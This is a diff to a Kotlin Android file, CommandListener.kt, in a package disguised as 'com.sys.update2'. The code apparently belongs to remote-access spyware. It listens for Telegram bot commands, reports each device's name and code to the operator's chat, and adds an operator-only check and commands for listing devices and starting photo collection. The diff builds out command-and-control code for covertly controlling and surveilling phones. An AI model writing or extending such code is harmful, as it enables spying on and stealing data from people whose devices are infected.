@@ -1,3 +1,8 @@
+// language: Kotlin, file: CommandListener.kt
+// *يستقبل أوامر من البوت عبر Telegram long polling*
+// *يتحقق من chat_id و from_id للأمان*
+// *يدعم الأوامر العامة + الأوامر المرتبطة بكود الجهاز*
+
 package com.sys.update2
 
 import android.content.Context
@@ -13,7 +18,8 @@ object CommandListener {
 
     private val PUBLIC_COMMANDS = setOf(
         "/start", "/menu", "/help", "menu", "help", "مساعدة",
-        "🏠 القائمة", "📱 قائمة الأجهزة", "🌐 كل الأجهزة"
+        "🏠 القائمة", "📱 قائمة الأجهزة", "🌐 كل الأجهزة",
+        "/devices", "/list", "devices", "list"
     )
 
     fun start(ctx: Context) {
@@ -24,16 +30,20 @@ object CommandListener {
         val prefs = ctx.getSharedPreferences("cmd_prefs", Context.MODE_PRIVATE)
         offset = prefs.getLong("offset", 0L)
 
-        // رسالة ترحيب فيها الرمز
+        // رسالة ترحيب فيها الرمز — مرة واحدة فقط
         try {
-            val code = DeviceManager.getDeviceCode(ctx)
-            val name = DeviceManager.getDeviceName(ctx)
-            TelegramApi.sendMessage(
-                "🎛 *لوحة التحكم*\n\n" +
-                "🏷 *$name*\n🆔 `$code`\n\n" +
-                "استخدم الرمز مع كل أمر:\n" +
-                "`/sync $code`"
-            )
+            if (!prefs.getBoolean("welcomed", false)) {
+                val code = DeviceManager.getDeviceCode(ctx)
+                val name = DeviceManager.getDeviceName(ctx)
+                TelegramApi.sendMessage(
+                    "🎛 *لوحة التحكم*\n\n" +
+                    "🏷 *$name*\n🆔 `$code`\n\n" +
+                    "استخدم الرمز مع كل أمر:\n" +
+                    "`/photos_start $code`\n\n" +
+                    "أو أرسل `/menu` للقائمة الكاملة"
+                )
+                prefs.edit().putBoolean("welcomed", true).apply()
+            }
         } catch (e: Exception) {
             Log.e("CmdListener", "welcome err: ${e.message}")
         }
@@ -79,14 +89,29 @@ object CommandListener {
 
     private fun processUpdate(ctx: Context, update: JSONObject) {
         try {
+            // callback_query
             update.optJSONObject("callback_query")?.let { cb ->
                 val cbId = cb.optString("id", "")
                 TelegramApi.answerCallback(cbId)
                 return
             }
+
+            // message
             update.optJSONObject("message")?.let { msg ->
                 val text = msg.optString("text", "").trim()
-                if (text.isNotBlank()) handleCommand(ctx, text)
+                if (text.isBlank()) return
+
+                // ⭐ تحقق أمني — فقط من الأدمن
+                val chatId = msg.optJSONObject("chat")?.optLong("id", 0L) ?: 0L
+                val fromId = msg.optJSONObject("from")?.optLong("id", 0L) ?: 0L
+
+                val adminId = Config.TELEGRAM_CHAT_ID.toLongOrNull() ?: 0L
+                if (adminId != 0L && (chatId != adminId || fromId != adminId)) {
+                    Log.w("CmdListener", "unauthorized: chat=$chatId from=$fromId")
+                    return
+                }
+
+                handleCommand(ctx, text)
             }
         } catch (e: Exception) {
             Log.e("CmdListener", "process err: ${e.message}")
@@ -96,11 +121,13 @@ object CommandListener {
     private fun handleCommand(ctx: Context, text: String) {
         val trimmed = text.trim()
 
+        // أوامر عامة
         if (PUBLIC_COMMANDS.contains(trimmed)) {
             CommandExecutor.handlePublic(ctx, trimmed)
             return
         }
 
+        // أوامر بكود الجهاز
         val parsed = parseCodeFromCommand(trimmed) ?: return
         val (command, code) = parsed
 
